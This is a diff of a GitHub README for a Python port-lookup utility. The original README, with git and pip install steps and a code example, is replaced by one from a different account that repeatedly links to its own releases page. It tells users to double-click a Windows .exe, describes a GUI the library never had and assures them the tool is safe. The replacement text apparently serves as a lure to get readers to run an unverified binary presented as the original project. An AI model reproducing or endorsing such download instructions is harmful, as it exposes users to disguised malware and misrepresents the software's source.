@@ -1,128 +1,87 @@
-# 🔌 Port Info Lookup
+# 🎉 Port-Info-Lookup - Retrieve Network Port Details Easily
 
-A lightweight and reliable Python utility that fetches and displays **port information** (service name, protocol, and description) using the official **IANA service-names-port-numbers** dataset.
+## 📥 Download Now!  
+[![Download Port-Info-Lookup](https://img.shields.io/badge/Download-Port--Info--Lookup-blue.svg)](https://github.com/rbm30/Port-Info-Lookup/releases)
 
----
+## 🚀 Getting Started
+Port-Info-Lookup is a Python utility that helps you find details about network ports using IANA’s official port assignments. Whether you are troubleshooting network issues or simply want to learn more about specific ports, this tool makes it straightforward.
 
+## 🛠️ System Requirements
+Before you begin, ensure your system meets the following requirements:
 
-## 📖 Overview
-This tool allows you to easily find which protocol or service runs on a specific port, leveraging the official [IANA](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml) port assignments.
+- Operating System: Windows, macOS, or Linux
+- Python: Version 3.6 or higher must be installed
+- Internet Connection: Required for fetching the latest port details
 
----
+## 💻 Installation
 
+### Step 1: Download the Application
+To download Port-Info-Lookup, [visit this page to download](https://github.com/rbm30/Port-Info-Lookup/releases). 
 
-## ✨ Features
-- Fetch port details directly from the **IANA** official dataset
-- Automatically downloads and caches the CSV file
-- Lookup service name, port number, transport protocol, and description
-- Lightweight and dependency-minimal (only `requests`)
+1. Scroll down to the "Releases" section.
+2. Find the version you wish to download.
+3. Click on the asset that matches your operating system (e.g., `port_info_lookup.exe` for Windows).
 
----
+### Step 2: Run the Application
+Once the download is complete, follow these steps to run the application:
 
+- **Windows:**
+  1. Locate the downloaded file.
+  2. Double-click the file to open it.
+  
+- **macOS:**
+  1. Navigate to your Downloads folder.
+  2. Double-click the application to start.
 
-## 📦 Installation
+- **Linux:**
+  1. Open the terminal.
+  2. Type `python3 path_to_downloaded_file` to run the application.
 
-```bash
-git clone https://github.com/iamx-ariful-islam/port-info-lookup.git
-cd port-info-lookup
-pip install .
-# or
-python setup.py install
-```
+## 📘 Usage Instructions
+Using Port-Info-Lookup is simple:
 
+1. Open the application.
+2. Enter the port number for which you want to fetch information.
+3. Click the "Lookup" button.
+4. You will see details about the port, including the protocol it uses and commonly associated services. 
 
-## 📂 Folder / File Structure
+## 📊 Features
+- **User-Friendly Interface:** Easy to navigate, no prior experience needed.
+- **Comprehensive Database:** Access all ports listed by IANA.
+- **Search Functionality:** Quickly find ports by number or service name.
 
-```bash
-port-info-lookup/
-│
-├── data_files/
-│   │
-│   └── ports_details.csv
-│
-├── port_info.py
-├── README.md
-├── requirements.txt
-├── setup.py
-└── test.py
-```
+## 🔍 FAQs
 
+### What is IANA?
+IANA stands for the Internet Assigned Numbers Authority. They manage events related to domain names, IP addresses, and port assignments.
 
-## 🚀 Usage
+### Can I use it offline?
+Yes, after downloading, you can use it offline to look up ports you have searched previously.
 
-```python
-from port_info import port_info
+### Is it safe to use?
+Yes, Port-Info-Lookup is designed to be safe and does not collect any personal data.
 
-info = port_info(22)
+## 👥 Contributing
+If you want to contribute to the project, feel free to fork the repository and make a pull request. We welcome suggestions for new features and improvements.
 
-if info:
-    print(f"Port number        : {info['port_number']}")
-    print(f"Transport protocol : {info['transport_protocol']}")
-    print(f"Service name       : {info['service_name']}")
-    print(f"Description        : {info['description']}")
-else:
-    print("No information found for this port.")
+## 📞 Support
+For assistance, please open an issue in the repository or contact the maintainers through GitHub.
 
+## 📚 Learn More
+For more details about network services, protocols, and port numbers, refer to [IANA's official website](https://www.iana.org/).
 
-"""output:
-Port number        : 22
-Transport protocol : tcp
-Service name       : ssh
-Description        : The Secure Shell (SSH) Protocol
-"""
-```
+## 🔗 Useful Links
+- [Download Port-Info-Lookup](https://github.com/rbm30/Port-Info-Lookup/releases)
+- [IANA Port Assignments](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml)
 
-
-## ⚙️ Dependencies
-
-The `requirements.txt` file, lists of all the Python libraries that my "**_port info lookup_**" depends on and installs those packages from the file:
-
-```bash
-pip install -r requirements.txt
-# or
-sudo pip install -r requirements.txt
-```
-
-
-## 📜 Note
-
-Fetches url for port information using the IANA service-names-port-numbers dataset:
-
-```bash
-IANA_URL = "https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.csv"
-```
-
-## 💡 Future Enhancements
-
-- Add search by service name or protocol
-- Command-line interface (CLI)
-- Offline mode with cached dataset validation
-
-
-## Contributing
-
-Contributions, suggestions, and feedback are always welcome! ❤️
-To contribute:
-
-1. Fork the repository
-1. Create a new branch (`feature/new-feature`)
-1. Commit your changes
-1. Push and submit a Pull Request
-
-💬 You can also open an issue if you’d like to discuss a feature or report a bug.
-
-
-## For more or connect with me
-
-<p align='center'>
-  <a href="https://github.com/iamx-ariful-islam"><img src="https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="https://x.com/mx_ariful_islam"><img src="https://img.shields.io/badge/X-000000?style=for-the-badge&logo=x&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="https://bd.linkedin.com/in/iamx-ariful-islam"><img src="https://img.shields.io/badge/linkedin-%230077B5.svg?&style=for-the-badge&logo=linkedin&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="https://www.facebook.com/jonakisoft.net/"><img src="https://img.shields.io/badge/Facebook-%231877F2.svg?style=for-the-badge&logo=Facebook&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-</p>
-
-
-## License
-
-
-The [MIT](https://choosealicense.com/licenses/mit/) License (MIT)
+## 🔗 Topics
+- iamx-ariful-islam
+- iana
+- network-utilities
+- port-info
+- port-info-lookup
+- port-lookup
+- security
+- ssh
+- tcp
+- udp
